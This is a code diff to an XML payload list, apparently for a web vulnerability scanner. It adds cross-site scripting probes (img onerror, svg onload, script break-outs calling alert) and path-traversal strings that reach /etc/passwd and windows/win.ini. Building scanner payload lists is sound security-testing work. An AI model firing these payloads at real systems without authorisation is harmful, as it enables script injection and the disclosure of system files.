@@ -6,7 +6,19 @@
         <xss_string><![CDATA[<SCrIpT>alert(__RANDOM_INT__)</ScRiPt>]]></xss_string>
         <xss_string><![CDATA[</TITLE><SCRIPT>alert(__RANDOM_INT__);</SCRIPT>]]></xss_string>
         <xss_string><![CDATA[<ScR<script>iPt>alert(__RANDOM_INT__)</SCr<script>IpT>]]></xss_string>
+        <xss_string><![CDATA[<img src=x onerror=alert(__RANDOM_INT__)>]]></xss_string>
         <xss_string><![CDATA[<<SCRIPT>alert(__RANDOM_INT__);//<</SCRIPT>]]></xss_string>
+        <xss_string><![CDATA[<svg/onload=alert(__RANDOM_INT__)>]]></xss_string>
+        <xss_string><![CDATA["--></style></scRipt><scRipt>alert(__RANDOM_INT__)</scRipt>]]></xss_string>
 
     </xss_payload>
+
+    <trav_payload>
+        <!-- This is base payload module using for inject payload <script>
+        __RANDOM_INT__ has been use when run this module-->
+        <trav_string><![CDATA[../../../../../../../../../../../../../../../../../../../../etc/passwd]]></trav_string>
+        <trav_string><![CDATA[..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini]]></trav_string>
+        <trav_string><![CDATA[../../../../../../../../../../../../../../../../../../../../../../windows/win.ini]]></trav_string>
+    </trav_payload>
+
 </payload>
